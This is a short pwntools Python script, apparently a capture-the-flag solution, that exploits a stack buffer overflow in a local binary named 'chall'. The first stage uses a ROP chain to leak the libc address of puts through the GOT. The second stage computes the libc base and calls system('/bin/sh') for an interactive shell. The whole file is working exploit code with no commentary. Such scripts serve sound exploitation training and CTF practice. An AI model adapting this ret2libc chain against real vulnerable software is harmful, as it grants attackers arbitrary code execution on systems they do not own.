from pwn import *

context(os='linux', arch='amd64')

p = process('./chall')

elf  = ELF("chall")
libc = ELF("./libc6_2.26-0ubuntu2.1_amd64.so")
rop  = ROP(elf)

#Stage 1
junk = "A" * 40 
rop.search(regs=["rdi"], order = "regs")
rop.puts(elf.got["puts"])
rop.call(elf.symbols["main"])

p.recvrepeat(1)

log.info("Stage 1 ROP Chain\n" + rop.dump())
stage1 = junk + str(rop)
p.sendline(stage1)

leaked_puts = p.recv()[:6].strip().ljust(8, '\x00')

#Stage 2
libc.address = u64(leaked_puts) - libc.symbols['puts']
rop2 = ROP(libc)
rop2.system(next(libc.search('/bin/sh')))

p.recvrepeat(1)

log.info("Stage 2 ROP Chain:\n" + rop2.dump())
stage2 = junk + str(rop2)
p.sendline(stage2)
p.interactive()
